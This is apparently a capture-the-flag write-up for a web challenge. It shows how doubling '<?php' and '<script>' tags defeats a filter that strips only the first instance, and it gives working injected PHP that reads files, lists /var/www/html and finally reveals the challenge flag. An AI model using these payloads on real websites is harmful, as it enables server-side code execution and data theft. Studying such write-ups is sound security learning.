# web/ProgrammersHateProgramming

>web/ProgrammersHateProgramming

> Points\
>just a little different than normally. Link: http://147.182.172.217:42002/index.php

***

Right away, you can see that this website simply repeats what youve typed back to it, looks like xss to me

Taking a look at the provided source code, you can see that it removes any instance of "<?php", "?>", "<script>", "</script>" or "flag"

But whats that, it only removes the first instance! I immediately test
```php
<?php<?php echo '<b>Hello World</b>'; ?>?>
```
and sure enough it repeats in bold, onyl removing one instance of the php stuff

Similarily, I try
```javascript
<script><script>document.write(5 + 6);</script></script>
```
and it shows 11 as expected

Now to find the flag, sadly 
```php
<?php<?php
$myfile = fopen("flagflag.php", "r") or die("Unable to open file!");
echo fread($myfile,filesize("flag.php"));
fclose($myfile);
?>?>
```
Told me it doesnt exist in "/var/www/html/q4XjMFfKruNEK8G.php". So I tried
```php
<?php<?php
$myfile = fopen("/var/www/html/flagflag.php", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/var/www/html/flag.php"));
fclose($myfile);
?>?>
```
and got a similar error, after playing around a bit, it was time to bring out the big guns

I found this stack overflow, https://stackoverflow.com/questions/24783862/list-all-the-files-and-folders-in-a-directory-with-php-recursive-function
which gave me 
```php
<?php<?php
function getDirContents($dir, &$results = array()) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path;
        } else if ($value != "." && $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

var_dump(getDirContents('/var/www/html'));?>?>
```
and also gave me a HUGE list of php files similar to the output of this one. Unable to find a smart way to sift through them (I could see most recent were mine), I started from the oldest and worked forwards

I found some weird output, and then came across "0HSDLbraxTMJQXm.php" with the desired flag, 
```
flag{server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we're_developing_a_really_meaningful_connection}
```
